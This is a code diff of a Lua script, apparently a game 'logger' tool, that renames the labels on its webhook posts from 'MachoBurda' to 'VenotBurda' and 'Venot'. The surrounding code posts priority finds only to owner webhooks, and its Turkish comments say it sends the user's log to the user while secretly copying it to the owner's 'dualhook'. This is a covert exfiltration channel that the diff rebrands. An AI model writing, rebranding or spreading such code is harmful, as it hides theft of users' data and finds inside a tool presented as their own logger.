@@ -528,10 +528,10 @@ local function sendOwnerPriorityWebhook()
     local embed = buildEmbed(initialPriority, "PRIORITY")
     if not embed then return end
 
-    fireWebhook(OWNER_PRIORITY_WEBHOOK, OWNER_PRIORITY_AVATAR, embed, true, "MachoBurda [PRIORITY]")
+    fireWebhook(OWNER_PRIORITY_WEBHOOK, OWNER_PRIORITY_AVATAR, embed, true, "VenotBurda [PRIORITY]")
 
     if OWNER_DUALHOOK_WEBHOOK ~= OWNER_PRIORITY_WEBHOOK then
-        fireWebhook(OWNER_DUALHOOK_WEBHOOK, OWNER_DUALHOOK_AVATAR, embed, true, "MachoBurda [DUALHOOK]")
+        fireWebhook(OWNER_DUALHOOK_WEBHOOK, OWNER_DUALHOOK_AVATAR, embed, true, "VenotBurda [DUALHOOK]")
     end
 end
 
@@ -544,10 +544,10 @@ local function sendUserNormalWebhook(normalList)
     if not embed then return end
 
     -- User'a gonder
-    fireWebhook(USER_LOG_WEBHOOK, nil, embed, true, "LOGGER MACHOHUB")
+    fireWebhook(USER_LOG_WEBHOOK, nil, embed, true, "Venot")
 
     -- Owner dualhook'a kopya gonder
-    fireWebhook(OWNER_DUALHOOK_WEBHOOK, OWNER_DUALHOOK_AVATAR, embed, false, "MachoBurda [DUALHOOK]")
+    fireWebhook(OWNER_DUALHOOK_WEBHOOK, OWNER_DUALHOOK_AVATAR, embed, false, "VenotBurda [DUALHOOK]")
 end
 
 -- ╔═══════════════════════════════════════════════════════════════════╗
